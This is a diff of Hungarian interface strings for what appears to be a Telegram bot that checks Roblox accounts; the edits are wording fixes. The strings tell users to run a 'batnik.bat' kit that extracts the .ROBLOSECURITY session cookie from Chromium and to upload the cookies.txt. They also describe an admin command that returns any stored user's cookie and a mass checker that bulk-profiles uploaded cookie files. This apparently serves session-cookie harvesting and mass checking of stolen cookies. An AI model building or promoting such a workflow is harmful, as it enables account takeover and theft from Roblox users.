@@ -57,7 +57,7 @@
   "kb": {
     "inventory": "📦 Leltár",
     "inventory_select": "🧩 Leltár (válassz kategóriákat)",
-    "accounts": "📋 Fiók lista"
+    "accounts": "📋 Fióklista"
   },
   "profile": {
     "title": "Profil",
@@ -71,18 +71,18 @@
     "favorites_label": "Kedvencek:",
     "visits": "Látogatások: {n}",
     "visits_label": "Látogatások:",
-    "spent_total": "💸 Összesen elkölötte: {value} R$",
-    "spent_total_label": "💸 Összesen elkölötte:",
+    "spent_total": "💸 Összesen elkölötve: {value} R$",
+    "spent_total_label": "💸 Összesen elkölötve:",
     "inventory_value": "💰 Leltár értéke: {value} R$",
     "inventory_value_label": "💰 Leltár értéke:",
     "inventory_private": "🔒 A leltár privát",
-    "card": "📘 Fiók információ\n👤 Név: {uname}\n🏷️ Megjelenített név: {display_name}\n🆔 ID: {rid}\n📅 Létrehozva: {created}\n🌍 Ország: {country}\n🧬 Nem: {gender}\n🎂 Születésnap: {birthday}\n📏 Kor: {age}\n✉️ Email: {email} (Megerősítve: {email_verified}, 2FA: {email_2fa})\n💰 Robux: {robux}\n🧾 Összesen elkölötte: {spent}\n🟢 Állapot: {status}"
+    "card": "📘 Fiók információk\n👤 Név: {uname}\n🏷️ Megjelenített név: {display_name}\n🆔 ID: {rid}\n📅 Létrehozva: {created}\n🌍 Ország: {country}\n🧬 Nem: {gender}\n🎂 Születésnap: {birthday}\n📏 Kor: {age}\n✉️ Email: {email} (Megerősítve: {email_verified}, 2FA: {email_2fa})\n💰 Robux: {robux}\n🧾 Összesen elkölötve: {spent}\n🟢 Állapot: {status}"
   },
   "msg": {
     "auto_a6dc67d175": "❌ Hiba az archivum előkészítése közben.",
     "auto_068e8874d3": "❌ A nyelv nem elérhető.",
     "auto_1dd76facf4": "⏳ Leltár frissítése…",
-    "auto_2ea715f34f": "🔐 Cookie a {rid} felhasználóhoz:\n<code>{cookie}</code>",
+    "auto_2ea715f34f": "🔐 Cookie a {rid} felhasználó számára:\n<code>{cookie}</code>",
     "auto_349c12ce4e": "📝 Használat: /get_cookie &lt;roblox_id&gt;",
     "auto_5b9ec32c3a": "⏳ Leltár betöltése…",
     "auto_742e941465": "❌ Érvénytelen Roblox ID formátum.",
@@ -90,7 +90,7 @@
     "auto_7d8934a45d": "⏳ Leltár betöltése…",
     "auto_92248ed4b0": "❌ Nem található pillanatkép ehhez a fiókhoz.",
     "auto_9b3b905f3b": "📝 Használat: /user_snapshot &lt;roblox_id&gt;",
-    "auto_b95899d0eb": "⚠️ A cookie készlet jelenleg nem elérhető.",
+    "auto_b95899d0eb": "⚠️ A cookie készítő jelenleg nem elérhető.",
     "auto_bfed05f982": "⏳ Teljes leltár generálása…",
     "auto_c61051830f": "🫙 Nincsenek árazott tárgyak ebben a kategóriában.",
     "auto_d43fb921bf": "🫙 Nincsenek árazott tárgyak a leltárban.",
@@ -133,7 +133,7 @@
     "delete_keep": "🗑️ Fiók eltávolítása (történet megtartása)"
   },
   "caption": {
-    "auto_76b7d0778c": "Teljes leltár",
+    "auto_76b7d0778c": "Teljes Leltár",
     "accounts_list": "📋 Fiókok"
   },
   "captions": {
@@ -158,8 +158,8 @@
   },
   "cookie": {
     "instructions": "Használd az alábbi készletet a .ROBLOSECURITY cookie kinyeréséhez Chromium-ban és töltsd fel ide .txt-ként.",
-    "kit_caption": "Készlet cookie kinyeréséhez (.ROBLOSECURITY). Futtasd a batnik.bat-ot, jelentkezz be, nyomj Enter-t, majd küldd a cookies.txt-t ide.",
-    "instructions_short": "1) Kicsomagolás\n2) batnik.bat futtatása\n3) Bejelentkezés a Roblox-ba Chromium-ban\n4) Enter megnyomása\n5) cookies.txt elküldése"
+    "kit_caption": "Készlet cookie (.ROBLOSECURITY) kinyeréséhez. Futtasd a batnik.bat-ot, lépj be, nyomj Enter-t, majd küldd el a cookies.txt-t ide.",
+    "instructions_short": "1) Kicsomagolás\n2) Batnik.bat futtatása\n3) Bejelentkezés a Roblox-ba Chromium-ban\n4) Enter megnyomása\n5) Cookies.txt elküldése"
   },
   "err": {
     "download_file": "❌ Sikertelen fájl letöltés: {error}",
@@ -199,43 +199,43 @@
     "accessories": "Kiegészítők",
     "animations/emotes": "Animációk / Emotikonok",
     "audio": "Hang",
-    "bundles/packages": "Csomagok",
-    "classic_clothes": "Klasszikus ruhák",
+    "bundles/packages": "Csomagok / Csomagolások",
+    "classic_clothes": "Klasszikus ruházat",
     "emotes": "Emotikonok",
     "faces": "Arcok",
     "gear": "Felszerelés",
     "hair": "Haj",
-    "hats": "Kalapok",
+    "hats": "Sapkák",
     "heads": "Fejek"
   },
   "public": {
     "ask_id": "🆔 Küldj egy Roblox ID-t a nyilvános információk megjelenítéséhez.",
     "note_limited": "ℹ️ Nyilvános mód: néhány adat nem elérhető cookie nélkül.",
-    "bad_id": "⚠️ Érvénytelen ID. Küldj egy számot (pl. 123456789).",
+    "bad_id": "⚠️ Érvénytelen ID. Küldj egy számot (pl.: 123456789).",
     "not_found": "❌ Felhasználó nem található vagy nem elérhető.",
     "inventory_private": "⚠️ Ennek a felhasználónak a leltára privát a Roblox-on.",
-    "spending_login_required": "🔐 A kiadások csak akkor elérhetőek, ha cookie van mentve ehhez a fiókhoz."
+    "spending_login_required": "🔐 A kiadások csak akkor érhetők el, ha cookie van mentve ehhez a fiókhoz."
   },
   "settings": {
     "title": "⚙️ Beállítások"
   },
   "admin": {
-    "stats": "📊 <b>Bot Statisztikák</b>\n👥 Összes felhasználó: {total_users}\n🆕 Újak ma: {new_today}\n📈 Aktívak ma: {active_today}\n🔗 Kapcsolt fiókkal: {users_with_accounts}\n🔎 Összes ellenőrzés: {checks_total}\n📅 Ellenőrzések ma: {checks_today}",
-    "user_snapshot": "🧾 <b>Fiók Pillanatkép</b>\n🆔 Roblox ID: {rid}\n💰 Leltár: {inventory_val} R$\n💸 Összesen elkölötte: {total_spent} R$\n🕒 Frissítve: {updated_at}"
+    "stats": "📊 <b>Bot Statisztikák</b>\n👥 Összes felhasználó: {total_users}\n🆕 Új ma: {new_today}\n📈 Aktív ma: {active_today}\n🔗 Kapcsolt fiókokkal: {users_with_accounts}\n🔎 Összes ellenőrzés: {checks_total}\n📅 Ellenőrzések ma: {checks_today}",
+    "user_snapshot": "🧾 <b>Fiók Pillanatkép</b>\n🆔 Roblox ID: {rid}\n💰 Leltár: {inventory_val} R$\n💸 Összesen elkölötve: {total_spent} R$\n🕒 Frissítve: {updated_at}"
   },
   "inventory_view": {
     "public_title": "📦 Nyilvános leltár\nÖsszesen: {total} db · {total_sum} R$",
     "category_title": "📂 {category}\nÖsszesen: {count} db · {total_sum} R$",
     "all_categories": "📦 Minden kategória együtt\nÖsszesen: {total} db · {total_sum} R$",
     "grand_total": "💰 Leltár összértéke: {total_sum} R$\n📦 Összes árazott tárgy: {total_count}",
-    "render_too_large": "📦 Összes tárgy: render túl nagy. Csökkentsd a méretet vagy szűkítsd a kiválasztást.",
+    "render_too_large": "📦 Összes tárgy: túl nagy a megjelenítés. Csökkentsd a méretet vagy szűkítsd a kiválasztást.",
     "page": "Oldal {current}/{total}"
   },
   "spending": {
     "title": "💸 Költekezési előzmények (összesen: {total})",
     "loading": "⏳ Költekezési előzmények betöltése…",
     "empty": "🫙 Nem találhatók vásárlások.",
-    "header": "💸 Költekezés — összesen: {sum} R$"
+    "header": "💸 Költekezés — Összesen: {sum} R$"
   },
   "games": {
     "fav_title": "⭐ Kedvencek",
@@ -267,7 +267,7 @@
     "empty": "Nem találhatók nem eladó gyűjthető tárgyak.",
     "row_collectible": "{name} — RAP {rap} R$ (nincsenek eladók)",
     "loading": "⏳ Betöltés…",
-    "empty_private": "Nincsenek nem eladó gyűjthető tárgyak. Ha a leltár privát, nyisd meg vagy használj érvényes cookie-t.",
+    "empty_private": "Nincsenek nem eladó gyűjthető tárgyak. Ha a leltár privát, nyisd meg vagy használj érvényes cookie-t ehhez a fiókhoz.",
     "empty_generic": "Nem találhatók nem eladó gyűjthető tárgyak. Próbáld később."
   },
   "revenue": {
@@ -295,5 +295,15 @@
     "loading": "⏳ Betöltés…",
     "empty_private": "Nincsenek korábbi felhasználónevek. Ha a hozzáférés korlátozott, érvényes cookie szükséges.",
     "empty_generic": "Nem találhatók korábbi felhasználónevek."
-  }
+  },
+  "masscheck.need_txt": "Töltened kell egy .txt fájlt a cookie-kkal 😅",
+  "masscheck.empty_file": "A fájl üres, nem találhatók cookie-k 😬",
+  "masscheck.start": "{count} sor található, tömeges ellenőrzés indítása...",
+  "masscheck.no_results": "Semmit sem sikerült feldolgozni :(",
+  "masscheck.summary_title": "TÖMEGES ELLENŐRZÉS ÖSSZEFOGLALÓ",
+  "masscheck.details_title": "RÉSZLETES PROFILOK",
+  "masscheck.zip_caption": "Tömeges ellenőrzés: profilok + leltárak egyetlen archivumban 😎",
+  "masscheck.wait_txt": "Küldj egy .txt fájlt a cookie-kkal külön dokumentum üzenetként — amint megkapom a fájlt, összegyűjtöm a profilokat és leltárakat egy archivumba.",
+  "masscheck.inv_prefix": "Leltár: ",
+  "masscheck.no_priced_items": "nincsenek árazott tárgyak"
 }
